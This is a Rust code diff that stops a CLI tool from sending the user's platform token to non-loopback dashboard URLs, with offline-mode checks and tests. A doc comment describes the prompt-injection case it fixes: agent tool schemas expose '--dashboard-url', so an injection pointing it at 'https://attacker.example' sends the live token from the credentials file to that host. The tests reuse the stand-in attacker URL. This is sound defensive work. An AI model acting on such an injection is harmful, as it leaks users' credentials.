@@ -9471,12 +9471,59 @@ async fn create_dashboard_session_for_user(
     .await
 }
 
+/// Decide whether the platform credential may be sent to this dashboard.
+///
+/// Extracted so the RULE is testable. Asserting it through
+/// `create_dashboard_session_*` cannot work: with nothing listening the
+/// request fails before anything is transmitted, so such a test passes whether
+/// the token was withheld or not — it proves only that the error text is
+/// clean. This function is the decision itself.
+fn platform_token_for<'a>(dashboard_url: &str, token: Option<&'a str>) -> Option<&'a str> {
+    match token {
+        Some(_) if !prism_runtime::offline::is_loopback_url(dashboard_url) => {
+            eprintln!(
+                "note: not sending your platform credential to {dashboard_url} \
+                 — it is not a loopback address. The session is created without \
+                 platform access."
+            );
+            None
+        }
+        other => other,
+    }
+}
+
+/// Create a dashboard session, optionally handing the dashboard a platform
+/// token so it can call the platform on the user's behalf.
+///
+/// `platform_token` is only ever sent to a LOOPBACK dashboard.
+///
+/// `--dashboard-url` documents itself as "Dashboard URL of the running node"
+/// and defaults to `http://127.0.0.1:7327` — it exists to change YOUR node's
+/// port, not to name a third party. But it is a free-form string on
+/// `mesh publish/subscribe/unsubscribe` and on `query --federated`, and the
+/// agent tool schemas for those (agent/src/command_tools.rs) expose it to the
+/// model. A prompt injection setting
+/// `--dashboard-url https://attacker.example` therefore POSTed the user's live
+/// platform access token, read from `~/.prism/credentials.json`, to a host of
+/// the attacker's choosing. `PermissionMode::LocalOnly`'s env-stripping does
+/// not help: the credential comes off disk, not out of the environment.
+///
+/// Withholding it is a supported degradation rather than a new failure mode —
+/// `create_dashboard_session_for_user` already calls this with `None`, so a
+/// tokenless session is an existing, working shape. The session is still
+/// created; only the platform capability is withheld, and the caller is told.
 async fn create_dashboard_session_for_user_with_platform_token(
     dashboard_url: &str,
     user_id: &str,
     display_name: Option<&str>,
     platform_token: Option<&str>,
 ) -> Result<String> {
+    // Hard offline: the dashboard may be remote, so this is a network call
+    // like any other. Loopback stays permitted, matching llm/embed/workflows.
+    prism_runtime::offline::check_url(dashboard_url).map_err(|reason| anyhow!(reason))?;
+
+    let platform_token = platform_token_for(dashboard_url, platform_token);
+
     let url = format!("{dashboard_url}/api/sessions");
     let resp = reqwest::Client::new()
         .post(&url)
@@ -11483,6 +11530,10 @@ async fn handle_report(
         });
 
         let url = format!("{}/support/tickets", endpoints.api_base);
+        // `prism report` builds its own client rather than going through
+        // PlatformClient, so it inherited none of that type's offline guard
+        // and posted the session Bearer under PRISM_OFFLINE=1.
+        prism_runtime::offline::check_url(&url).map_err(|reason| anyhow!(reason))?;
         let resp = reqwest::Client::new()
             .post(&url)
             .header("Authorization", format!("Bearer {}", c.access_token))
@@ -11738,6 +11789,83 @@ fn resolve_unauth_llm_url(fallback_url: &str) -> anyhow::Result<String> {
 
 #[cfg(test)]
 mod tests {
+    /// The credential must never leave the machine for a host the caller
+    /// merely named. `--dashboard-url` is a free string on `mesh publish` and
+    /// `query --federated`, and the agent tool schemas expose it to the model,
+    /// so a prompt injection could point it anywhere.
+    #[test]
+    fn platform_token_only_goes_to_a_loopback_dashboard() {
+        // Loopback, in the spellings is_loopback_url accepts.
+        for ok in [
+            "http://127.0.0.1:7327",
+            "http://localhost:7327",
+            "http://[::1]:7327",
+        ] {
+            assert_eq!(
+                platform_token_for(ok, Some("live-token")),
+                Some("live-token"),
+                "{ok} is the user's own node"
+            );
+        }
+        // Anything else, including a private LAN address, is withheld.
+        for off_box in [
+            "https://attacker.example/x",
+            "http://203.0.113.9:7327",
+            "http://10.0.0.4:7327",
+        ] {
+            assert_eq!(
+                platform_token_for(off_box, Some("live-token")),
+                None,
+                "{off_box} must not receive the platform credential"
+            );
+        }
+        // No token in means no token out, loopback or not.
+        assert_eq!(platform_token_for("http://127.0.0.1:7327", None), None);
+    }
+
+    /// Hard offline refuses outright — and still permits loopback, matching
+    /// llm/embed/workflows rather than the blanket platform-client rule.
+    #[tokio::test]
+    #[allow(clippy::await_holding_lock)]
+    async fn dashboard_session_is_refused_offline_but_loopback_still_allowed() {
+        let _guard = boot_checks::ENV_LOCK
+            .lock()
+            .unwrap_or_else(|p| p.into_inner());
+        unsafe { std::env::set_var(prism_runtime::offline::ENV, "1") };
+
+        let remote = create_dashboard_session_for_user_with_platform_token(
+            "http://203.0.113.9:7327",
+            "user-1",
+            None,
+            None,
+        )
+        .await
+        .expect_err("offline must refuse a remote dashboard");
+        let remote_msg = format!("{remote:#}");
+
+        // Loopback is NOT refused by the policy; it fails on connect instead.
+        let local = create_dashboard_session_for_user_with_platform_token(
+            "http://127.0.0.1:1",
+            "user-1",
+            None,
+            None,
+        )
+        .await
+        .expect_err("nothing is listening on port 1");
+        let local_msg = format!("{local:#}");
+
+        unsafe { std::env::remove_var(prism_runtime::offline::ENV) };
+
+        assert!(
+            remote_msg.contains("offline mode"),
+            "remote must be refused by policy: {remote_msg}"
+        );
+        assert!(
+            !local_msg.contains("offline mode"),
+            "loopback must not be refused by policy: {local_msg}"
+        );
+    }
+
     use super::*;
 
     #[test]
